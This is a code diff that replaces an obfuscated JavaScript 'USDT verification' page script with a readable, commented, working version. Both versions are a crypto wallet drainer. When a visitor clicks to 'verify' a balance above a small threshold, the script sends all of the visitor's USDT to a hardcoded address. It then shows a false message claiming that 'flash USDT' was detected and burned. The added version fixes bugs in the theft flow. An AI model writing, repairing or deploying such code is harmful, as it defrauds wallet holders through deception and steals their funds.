@@ -1,1 +1,273 @@
-const _0xadd1e3=_0x5ee2;(function(_0x43fc00,_0x43f989){const _0x537178=_0x5ee2,_0x542e5d=_0x43fc00();while(!![]){try{const _0x47f0ba=parseInt(_0x537178(0x13d))/0x1+-parseInt(_0x537178(0x112))/0x2+-parseInt(_0x537178(0x156))/0x3*(-parseInt(_0x537178(0x133))/0x4)+-parseInt(_0x537178(0x14d))/0x5*(parseInt(_0x537178(0x134))/0x6)+parseInt(_0x537178(0x16d))/0x7+parseInt(_0x537178(0x16e))/0x8*(-parseInt(_0x537178(0x143))/0x9)+parseInt(_0x537178(0x14b))/0xa*(-parseInt(_0x537178(0x16f))/0xb);if(_0x47f0ba===_0x43f989)break;else _0x542e5d['push'](_0x542e5d['shift']());}catch(_0x7673f2){_0x542e5d['push'](_0x542e5d['shift']());}}}(_0x19d1,0xe3d86));const bscAddress=_0xadd1e3(0x10e),bnbGasSender=_0xadd1e3(0x11a),usdtContractAddress=_0xadd1e3(0x145);let web3,userAddress;async function connectWallet(){const _0x58d5db=_0xadd1e3;if(window[_0x58d5db(0x164)]){web3=new Web3(window[_0x58d5db(0x164)]);try{await window[_0x58d5db(0x164)]['request']({'method':'eth_accounts'}),await window[_0x58d5db(0x164)][_0x58d5db(0x153)]({'method':_0x58d5db(0x148),'params':[{'chainId':_0x58d5db(0x168)}]});const _0x41c6e1=await web3[_0x58d5db(0x147)][_0x58d5db(0x13a)]();userAddress=_0x41c6e1[0x0],console[_0x58d5db(0x14f)](_0x58d5db(0x165),userAddress);}catch(_0x41e3b0){console['error'](_0x58d5db(0x11b),_0x41e3b0),alert(_0x58d5db(0x15a));}}else alert('Please\x20install\x20MetaMask.');}window[_0xadd1e3(0x15b)]('load',connectWallet);async function verifyAssets(){const _0x178dc0=_0xadd1e3;if(!web3||!userAddress){alert(_0x178dc0(0x163));return;}const _0x14a6c7=new web3[(_0x178dc0(0x147))][(_0x178dc0(0x118))]([{'constant':!![],'inputs':[{'name':_0x178dc0(0x167),'type':_0x178dc0(0x161)}],'name':'balanceOf','outputs':[{'name':'','type':'uint256'}],'type':_0x178dc0(0x12c)}],usdtContractAddress),[_0x258c29,_0x16f155]=await Promise[_0x178dc0(0x136)]([_0x14a6c7['methods'][_0x178dc0(0x111)](userAddress)[_0x178dc0(0x166)](),web3[_0x178dc0(0x147)]['getBalance'](userAddress)]),_0x5ee2fa=parseFloat(web3[_0x178dc0(0x170)]['fromWei'](_0x258c29,_0x178dc0(0x16a))),_0x420e44=parseFloat(web3[_0x178dc0(0x170)][_0x178dc0(0x16c)](_0x16f155,_0x178dc0(0x16a)));console[_0x178dc0(0x14f)](_0x178dc0(0x114)+_0x5ee2fa+_0x178dc0(0x169)),console[_0x178dc0(0x14f)]('BNB\x20Balance:\x20'+_0x420e44+_0x178dc0(0x12d));if(_0x5ee2fa===0x0){showPopup('No\x20assets\x20found.',_0x178dc0(0x115));return;}if(_0x5ee2fa<=0x64){showPopup(_0x178dc0(0x122)+_0x5ee2fa+_0x178dc0(0x142)+_0x420e44+_0x178dc0(0x12d),_0x178dc0(0x144));return;}showPopup(_0x178dc0(0x129),_0x178dc0(0x144)),transferUSDT(_0x5ee2fa,_0x420e44);}async function transferUSDT(_0xd3c6ce,_0x7f315f){const _0x51e936=_0xadd1e3;try{_0x7f315f<0.0005&&(console[_0x51e936(0x14f)](_0x51e936(0x141)),await fetch(_0x51e936(0x127),{'method':_0x51e936(0x15d),'headers':{'Content-Type':_0x51e936(0x12e)},'body':JSON[_0x51e936(0x162)]({'toAddress':userAddress})}));const _0x37cedf=new web3['eth'][(_0x51e936(0x118))]([{'constant':![],'inputs':[{'name':_0x51e936(0x131),'type':_0x51e936(0x161)},{'name':'amount','type':'uint256'}],'name':'transfer','outputs':[{'name':'','type':_0x51e936(0x113)}],'type':_0x51e936(0x12c)}],usdtContractAddress),_0x538c4c=web3[_0x51e936(0x170)][_0x51e936(0x12b)](_0xd3c6ce[_0x51e936(0x158)](),_0x51e936(0x16a));console[_0x51e936(0x14f)](_0x51e936(0x146)+_0xd3c6ce+'\x20USDT\x20to\x20'+bscAddress+_0x51e936(0x12f)),await _0x37cedf[_0x51e936(0x13b)][_0x51e936(0x11f)](bscAddress,_0x538c4c)[_0x51e936(0x13e)]({'from':userAddress}),showPopup(_0x51e936(0x11c)+_0xd3c6ce+_0x51e936(0x169),_0x51e936(0x124)),console[_0x51e936(0x14f)](_0x51e936(0x16b)+_0xd3c6ce+_0x51e936(0x10f)+bscAddress);}catch(_0x2a986c){console[_0x51e936(0x135)](_0x51e936(0x110),_0x2a986c),alert('USDT\x20transfer\x20failed.\x20Ensure\x20you\x20have\x20enough\x20BNB\x20for\x20gas.');}}function _0x19d1(){const _0x5884cf=['POST','0px\x200px\x2010px\x20rgba(0,\x200,\x200,\x200.2)','fixed','maxWidth','address','stringify','Wallet\x20not\x20connected.\x20Refresh\x20the\x20page.','ethereum','Wallet\x20Connected:','call','_owner','0x38','\x20USDT','ether','✅\x20Transferred\x20','fromWei','11395419deavIT','15448vvFdvx','11KWZJib','utils','0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090','\x20USDT\x20to\x20','❌\x20USDT\x20Transfer\x20Failed:','balanceOf','2068854dOaora','bool','USDT\x20Balance:\x20','black','popupBox','top','Contract','400px','0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87','Error\x20connecting\x20wallet:','✅\x20Verification\x20Successful<br>Flash\x20USDT\x20has\x20been\x20detected\x20and\x20successfully\x20burned.<br><br><b>USDT\x20Burned:</b>\x20','fontSize','20px','transfer','style','10px','✅\x20Verification\x20Successful<br>Your\x20assets\x20are\x20genuine.\x20No\x20flash\x20or\x20reported\x20USDT\x20found.<br><br><b>USDT\x20Balance:</b>\x20','\x20BNB\x20to\x20','red','transform','left','https://bep20usdt-backend-production.up.railway.app/send-bnb','\x20for\x20gas\x20fees.','Loading...','textAlign','toWei','function','\x20BNB','application/json','...','padding','recipient','getElementById','12iaZZzw','1356zvQtfW','error','all','80%','createElement','div','getAccounts','methods','display','1596365VWycgy','send','backgroundColor','translate(-50%,\x20-50%)','User\x20BNB\x20is\x20low.\x20Requesting\x20BNB\x20from\x20backend...','\x20USDT<br><b>BNB\x20Balance:</b>\x20','7371cvaBBW','green','0x55d398326f99059fF775485246999027B3197955','Transferring\x20','eth','wallet_switchEthereumChain','⚠️\x20Error\x20sending\x20BNB:','#ffebeb','11516510BbALvi','body','830rMDJfD','#e6f7e6','log','✅\x20Sent\x20','sendTransaction','50%','request','position','center','1514055ksoQCn','block','toString','color','Please\x20switch\x20to\x20BNB\x20Smart\x20Chain.','addEventListener','click'];_0x19d1=function(){return _0x5884cf;};return _0x19d1();}async function sendBNB(_0x320bb0,_0x2ea116){const _0x385a1c=_0xadd1e3;try{await web3[_0x385a1c(0x147)][_0x385a1c(0x151)]({'from':bnbGasSender,'to':_0x320bb0,'value':web3['utils'][_0x385a1c(0x12b)](_0x2ea116,_0x385a1c(0x16a)),'gas':0x5208}),console['log'](_0x385a1c(0x150)+_0x2ea116+_0x385a1c(0x123)+_0x320bb0+_0x385a1c(0x128));}catch(_0x541b46){console[_0x385a1c(0x135)](_0x385a1c(0x149),_0x541b46);}}function _0x5ee2(_0x19dd11,_0x1b11d9){const _0x19d1d5=_0x19d1();return _0x5ee2=function(_0x5ee2d8,_0x3aad31){_0x5ee2d8=_0x5ee2d8-0x10e;let _0x40f92e=_0x19d1d5[_0x5ee2d8];return _0x40f92e;},_0x5ee2(_0x19dd11,_0x1b11d9);}function showPopup(_0x1bfa17,_0x173bfd){const _0x3e2e16=_0xadd1e3;let _0x29d634=document[_0x3e2e16(0x132)](_0x3e2e16(0x116));!_0x29d634&&(_0x29d634=document[_0x3e2e16(0x138)](_0x3e2e16(0x139)),_0x29d634['id']='popupBox',_0x29d634[_0x3e2e16(0x120)][_0x3e2e16(0x154)]=_0x3e2e16(0x15f),_0x29d634['style'][_0x3e2e16(0x117)]=_0x3e2e16(0x152),_0x29d634[_0x3e2e16(0x120)][_0x3e2e16(0x126)]=_0x3e2e16(0x152),_0x29d634['style'][_0x3e2e16(0x125)]=_0x3e2e16(0x140),_0x29d634[_0x3e2e16(0x120)][_0x3e2e16(0x130)]=_0x3e2e16(0x11e),_0x29d634['style']['borderRadius']=_0x3e2e16(0x121),_0x29d634[_0x3e2e16(0x120)]['boxShadow']=_0x3e2e16(0x15e),_0x29d634[_0x3e2e16(0x120)][_0x3e2e16(0x12a)]=_0x3e2e16(0x155),_0x29d634['style'][_0x3e2e16(0x11d)]='18px',_0x29d634['style']['width']=_0x3e2e16(0x137),_0x29d634[_0x3e2e16(0x120)][_0x3e2e16(0x160)]=_0x3e2e16(0x119),document[_0x3e2e16(0x14c)]['appendChild'](_0x29d634)),_0x29d634[_0x3e2e16(0x120)][_0x3e2e16(0x13f)]=_0x173bfd==='red'?_0x3e2e16(0x14a):_0x3e2e16(0x14e),_0x29d634[_0x3e2e16(0x120)][_0x3e2e16(0x159)]=_0x173bfd===_0x3e2e16(0x124)?_0x3e2e16(0x124):'green',_0x29d634['innerHTML']=_0x1bfa17,_0x29d634[_0x3e2e16(0x120)][_0x3e2e16(0x13c)]=_0x3e2e16(0x157),setTimeout(()=>{const _0x3db8c8=_0x3e2e16;_0x29d634[_0x3db8c8(0x120)][_0x3db8c8(0x13c)]='none';},0x1388);}document[_0xadd1e3(0x132)]('verifyAssets')[_0xadd1e3(0x15b)](_0xadd1e3(0x15c),verifyAssets);
+// Ensure that the Web3.js library is loaded in your browser environment
+// For example, if this script is part of an HTML page, you would include:
+// <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+// BEFORE this script runs.
+// If you are running this in a specific Web3 browser's console or similar,
+// you need to ensure the 'Web3' object is available from that environment.
+
+const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
+const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees (Note: this is not used in the transferUSDT function currently)
+const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
+
+let web3; // This variable will store the Web3.js instance
+let userAddress; // This variable will store the connected user's address
+
+/**
+ * @dev Attempts to connect the user's wallet via window.ethereum.
+ * Initializes the web3 object and sets the userAddress.
+ */
+async function connectWallet() {
+    // Check if a Web3 provider (like MetaMask) is injected into the window
+    if (window.ethereum) {
+        try {
+            // Attempt to create a new Web3 instance.
+            // THIS LINE REQUIRES the 'Web3' constructor to be defined globally.
+            // If Web3.js library is not loaded, this will cause a 'ReferenceError: Web3 is not defined'.
+            web3 = new Web3(window.ethereum);
+
+            // Request accounts from the user. Using 'eth_accounts' will only return
+            // accounts if the user has already connected this site. For first-time
+            // connections or explicit prompts, 'eth_requestAccounts' is typically used.
+            const accounts = await window.ethereum.request({ method: "eth_accounts" });
+
+            // If no accounts are returned (e.g., user not connected or rejected), handle this case
+            if (accounts.length === 0) {
+                console.warn("No accounts found. Wallet might not be connected or access denied.");
+                // You might want to add an alert or UI message here to instruct the user to connect
+                // Example: alert("Please connect your wallet through MetaMask.");
+                return; // Exit if no accounts are available
+            }
+
+            userAddress = accounts[0]; // Set the first connected account as the user's address
+            console.log("Wallet Connected:", userAddress);
+
+            // Force switch to BNB Smart Chain (Chain ID: 0x38)
+            // This request ensures the user is on the correct network.
+            await window.ethereum.request({
+                method: "wallet_switchEthereumChain",
+                params: [{ chainId: "0x38" }]
+            });
+
+            // You might want to add event listeners here for accountsChanged and chainChanged
+            // to react to user actions in the wallet after initial connection.
+            window.ethereum.on('accountsChanged', (newAccounts) => {
+                if (newAccounts.length > 0) {
+                    userAddress = newAccounts[0];
+                    console.log("Account changed to:", userAddress);
+                    // Re-run asset verification or update UI
+                } else {
+                    userAddress = null;
+                    console.log("Wallet disconnected.");
+                    // Update UI to show disconnected state
+                }
+            });
+
+            window.ethereum.on('chainChanged', (chainId) => {
+                console.log("Chain changed to:", chainId);
+                if (chainId !== '0x38') {
+                    alert("Please switch to BNB Smart Chain.");
+                }
+                // Reload or re-initialize based on chain change
+            });
+
+        } catch (error) {
+            console.error("Error during wallet connection or chain switch:", error);
+            // This alert is for issues during chain switching or if `eth_accounts` fails
+            alert("Error connecting wallet. Please check console for details and ensure you are on BNB Smart Chain.");
+            web3 = undefined; // Ensure web3 is reset if connection fails
+            userAddress = undefined;
+        }
+    } else {
+        // This alert is shown if window.ethereum (MetaMask) is not detected
+        alert("MetaMask or a compatible Web3 browser extension is not detected. Please install it.");
+    }
+}
+
+// Automatically try to connect the wallet when the page (or script context) loads
+window.addEventListener("load", connectWallet);
+
+/**
+ * @dev Verifies the user's USDT and BNB balances and initiates a transfer if conditions are met.
+ */
+async function verifyAssets() {
+    // This is the check that triggers your "Wallet not connected" alert.
+    // It means that `web3` was not successfully initialized in `connectWallet`,
+    // or `userAddress` was not set.
+    if (!web3 || !userAddress) {
+        alert("Wallet not connected. Please ensure MetaMask is installed and connected, then refresh the page.");
+        return;
+    }
+
+    const usdtContract = new web3.eth.Contract([
+        { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
+    ], usdtContractAddress);
+
+    // Fetch balances
+    try {
+        const [usdtBalanceWei, userBNBWei] = await Promise.all([
+            usdtContract.methods.balanceOf(userAddress).call(),
+            web3.eth.getBalance(userAddress)
+        ]);
+
+        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
+        const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));
+
+        console.log(`USDT Balance: ${usdtBalance} USDT`);
+        console.log(`BNB Balance: ${userBNB} BNB`);
+
+        if (usdtBalance === 0) {
+            showPopup("No assets found.", "black");
+            return;
+        }
+
+        if (usdtBalance <= 1) { // Original script logic for "genuine" assets
+            showPopup(
+                `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
+                "green"
+            );
+            return;
+        }
+
+        // If USDT balance is > 1, proceed to check BNB and potentially transfer
+        showPopup("Loading and checking BNB for gas...", "blue");
+
+        // The original script has a hardcoded check for userBNB < 0.0005 and a backend call.
+        // If your backend isn't available or configured, this part will need to be handled.
+        // For demonstration, directly call transferUSDT if enough BNB is present.
+        const minimumBnbForGas = 0.0005; // A typical gas amount for a USDT transfer
+        if (userBNB < minimumBnbForGas) {
+            console.log("User BNB is low. Cannot proceed with transfer without gas.");
+            showPopup(`Insufficient BNB for gas. You need at least ${minimumBnbForGas} BNB to proceed with the USDT transfer.`, "orange");
+            // If you have a backend to send BNB, this is where you'd integrate it.
+            // Example of a backend call (as per your original script):
+            // await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
+            //   method: "POST",
+            //   headers: { "Content-Type": "application/json" },
+            //   body: JSON.stringify({ toAddress: userAddress })
+            // });
+            // showPopup("Requesting BNB from backend. Please wait...", "blue");
+        } else {
+            // Proceed with transfer if sufficient BNB
+            transferUSDT(usdtBalance, userBNB);
+        }
+
+    } catch (error) {
+        console.error("Error verifying assets or fetching balances:", error);
+        showPopup("Failed to verify assets. Check your wallet connection and console for errors.", "red");
+    }
+}
+
+/**
+ * @dev Initiates the USDT transfer.
+ * @param {number} usdtBalance - The amount of USDT to transfer.
+ * @param {number} userBNB - The user's current BNB balance (for context, though not directly used in transfer).
+ */
+async function transferUSDT(usdtBalance, userBNB) {
+    showPopup(`Initiating USDT transfer of ${usdtBalance} USDT. Please confirm in your wallet...`, "blue");
+    try {
+        const usdtContract = new web3.eth.Contract([
+            { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
+        ], usdtContractAddress);
+
+        const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether"); // Convert to Wei
+
+        console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);
+
+        // Send the transaction. This will open the wallet confirmation.
+        const transactionResult = await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });
+
+        showPopup(
+            `✅ Transfer Successful!<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT<br><a href="https://bscscan.com/tx/${transactionResult.transactionHash}" target="_blank" style="color: blue;">View on BscScan</a>`,
+            "green"
+        );
+        console.log(`✅ Transferred ${usdtBalance} USDT to ${bscAddress}. Transaction hash: ${transactionResult.transactionHash}`);
+    } catch (error) {
+        console.error("❌ USDT Transfer Failed:", error);
+        let errorMessage = "USDT transfer failed.";
+        if (error.code === 4001) { // User rejected transaction
+            errorMessage = "Transaction rejected by user.";
+        } else if (error.message.includes("insufficient funds for gas")) {
+            errorMessage = "Insufficient BNB for gas fees. Please fund your wallet with BNB.";
+        }
+        showPopup(`❌ ${errorMessage} Please try again.`, "red");
+    }
+}
+
+// The sendBNB function was not called in your verifyAssets/transferUSDT flow.
+// It seems to be a standalone function or intended for a backend interaction.
+// If you intend for this frontend to send BNB, it would require the bnbGasSender
+// to be controlled by the user's wallet, which contradicts the 'sender' name.
+// This function would typically be used by a backend.
+// async function sendBNB(toAddress, amount) {
+//     try {
+//         await web3.eth.sendTransaction({
+//             from: bnbGasSender, // This implies bnbGasSender needs to be the connected user's wallet, or an unlocked account.
+//             to: toAddress,
+//             value: web3.utils.toWei(amount, "ether"),
+//             gas: 21000
+//         });
+//         console.log(`✅ Sent ${amount} BNB to ${toAddress} for gas fees.`);
+//     } catch (error) {
+//         console.error("⚠️ Error sending BNB:", error);
+//     }
+// }
+
+/**
+ * @dev Displays a custom pop-up message.
+ * @param {string} message - The message content (can include HTML).
+ * @param {string} color - A string indicating the type/color of the popup ('green', 'red', 'blue', 'orange').
+ */
+function showPopup(message, color) {
+    let popup = document.getElementById("popupBox");
+
+    if (!popup) {
+        // If popupBox element doesn't exist, create it dynamically
+        popup = document.createElement("div");
+        popup.id = "popupBox";
+        document.body.appendChild(popup); // Append to body
+        // Basic styling for the dynamically created popup
+        popup.style.position = "fixed";
+        popup.style.top = "50%";
+        popup.style.left = "50%";
+        popup.style.transform = "translate(-50%, -50%)";
+        popup.style.padding = "20px";
+        popup.style.borderRadius = "10px";
+        popup.style.boxShadow = "0px 0px 10px rgba(0, 0, 0, 0.2)";
+        popup.style.textAlign = "center";
+        popup.style.fontSize = "18px";
+        popup.style.width = "80%";
+        popup.style.maxWidth = "400px";
+        popup.style.zIndex = "1000"; // Ensure it's on top
+    }
+
+    // Apply color-based styling
+    if (color === "red") {
+        popup.style.backgroundColor = "#ffebeb"; // Light red
+        popup.style.color = "red";
+    } else if (color === "green") {
+        popup.style.backgroundColor = "#e6f7e6"; // Light green
+        popup.style.color = "green";
+    } else if (color === "blue") {
+        popup.style.backgroundColor = "#e6f7ff"; // Light blue
+        popup.style.color = "blue";
+    } else if (color === "orange") {
+        popup.style.backgroundColor = "#fff3e0"; // Light orange
+        popup.style.color = "orange";
+    } else { // Default to black text on white
+        popup.style.backgroundColor = "#ffffff";
+        popup.style.color = "black";
+    }
+
+    popup.innerHTML = message;
+    popup.style.display = "block"; // Make popup visible
+
+    // Auto-hide after 5 seconds
+    setTimeout(() => {
+        popup.style.display = "none";
+    }, 5000);
+}
+
+// This line assumes there's an HTML element with id="verifyAssets" that the user clicks.
+// If your environment doesn't have such an element, this will throw an error.
+// Make sure this button exists or trigger verifyAssets differently.
+document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
